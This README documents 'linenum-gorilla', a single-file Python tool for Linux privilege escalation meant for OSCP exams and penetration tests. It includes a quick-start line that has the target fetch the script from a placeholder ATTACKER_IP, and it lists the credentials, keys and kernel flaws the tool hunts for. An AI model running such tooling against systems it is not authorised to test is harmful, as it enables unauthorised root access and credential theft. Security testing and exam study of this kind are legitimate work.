# 🦍 linenum-gorilla

**Linux Privilege Escalation Suite** — One file. No dependencies. Works offline.

Combines **GTFOBins exploit automation** with **full LinEnum-ng system enumeration** into a single Python script you can transfer to any target.

## Why?

On the OSCP exam (or any engagement), you need:
1. Transfer privesc tool to target machine (no internet)
2. Run it
3. Get actionable results — not walls of text

`gorilla.py` gives you **copy-paste exploit commands** + **full system enumeration** in one `wget`.

## Quick Start

```bash
# On Kali (attacker):
python3 -m http.server 80

# On target:
wget http://ATTACKER_IP/gorilla.py
python3 gorilla.py
```

That's it. No `pip install`, no `chmod +x`, no multi-file transfers.

## What It Does

### Phase 1: GTFOBins Exploitation (auto)
- **SUID binaries** → instant exploit commands (`find / -perm -u=s`)
- **Sudo permissions** → exploitation steps (`sudo -n -l`)
- **Linux capabilities** → privesc vectors (`getcap -r /`)

Each finding includes the exact command to copy-paste for privilege escalation.

### Phase 2: Full System Enumeration (auto)

| Section | What it checks |
|---------|---------------|
| System Info | Kernel version, OS, architecture |
| Kernel CVEs | PwnKit, Dirty Pipe, Dirty COW, Baron Samedit |
| User/Groups | Writable /etc/passwd, shadow, docker/lxd/disk groups |
| Environment | Writable PATH dirs, leaked secrets in env vars |
| Cron & Timers | Writable cron files, writable scripts in crontab |
| Network | Listening services, internal ports |
| SSH | Private keys, writable authorized_keys |
| Passwords | wp-config, .git-credentials, htpasswd, bash history |
| Services | Writable systemd units, root processes |
| Database | MySQL/PostgreSQL default credentials |
| NFS & Mounts | no_root_squash, credentials in fstab |
| Containers | Docker, LXC, Kubernetes pod detection |
| Home Dirs | Accessible home directories, interesting files |
| Recent Files | Files modified in last 10 minutes |

## Usage

```bash
# Full auto (recommended) — runs everything:
python3 gorilla.py

# Exam mode — minimal noise, only critical findings:
python3 gorilla.py --exam

# Only enumeration (skip SUID/sudo/cap analysis):
python3 gorilla.py --enum-only

# Only SUID/sudo/cap (skip enumeration):
python3 gorilla.py --no-enum

# Quick check a single binary:
python3 gorilla.py --check find
python3 gorilla.py --check vim --mode sudo

# Pipe mode:
find / -perm -u=s -type f 2>/dev/null | python3 gorilla.py
sudo -l | python3 gorilla.py --sudo
getcap -r / 2>/dev/null | python3 gorilla.py --cap

# JSON output:
python3 gorilla.py --check python3 --json
```

## Flags

| Flag | Description |
|------|-------------|
| `--exam` | Clean output, only actionable results (priority 1-3) |
| `--no-enum` | Skip system enumeration, only run SUID/sudo/cap |
| `--enum-only` | Skip SUID/sudo/cap, only run enumeration |
| `--check BIN` | Quick check a single binary |
| `--mode` | Mode for --check: `suid`, `sudo`, `capabilities` |
| `--sudo` | Parse piped `sudo -l` output |
| `--cap` | Parse piped `getcap` output |
| `--json` | JSON output |
| `--no-banner` | Suppress banner |
| `--no-color` | Disable colors |
| `--online` | Query GTFOBins website for unknown binaries |
| `--update-db` | Update embedded DB from GTFOBins (needs internet) |

## Output Priority

| Level | Meaning | Action |
|-------|---------|--------|
| 🔴 CRITICAL | Instant shell / confirmed vuln | Exploit immediately |
| 🟡 HIGH | Reverse shell / major vector | Exploit with setup |
| 🔵 MEDIUM | File read (shadow, SSH keys) | Extract creds |
| 🔷 LOW | File write / limited | May lead to escalation |
| ⚪ INFO | Informational | Note for later |

## Embedded Database

`gorilla.py` contains:
- **279 binaries** with SUID/Sudo/Capabilities exploit commands
- **37 aliases** for binary name normalization
- **25+ OSCP-common vectors** (PwnKit, Screen 4.5.0, Docker, LXD, etc.)
- **322 GTFOBins entries** for offline lookup

No internet needed. Everything is embedded in the single file.

## Requirements

- Python 3.6+ (standard on modern Linux)
- No pip packages needed
- No compilation needed

## Credits

Built on:
- [strikoder/gtfobinSUID](https://github.com/strikoder/gtfobinSUID) — original SUID checker
- [strikoder/LinEnum-ng](https://github.com/strikoder/LinEnum-ng) — enumeration methodology
- [GTFOBins](https://gtfobins.github.io/) — binary exploitation database

## License

GPL-3.0
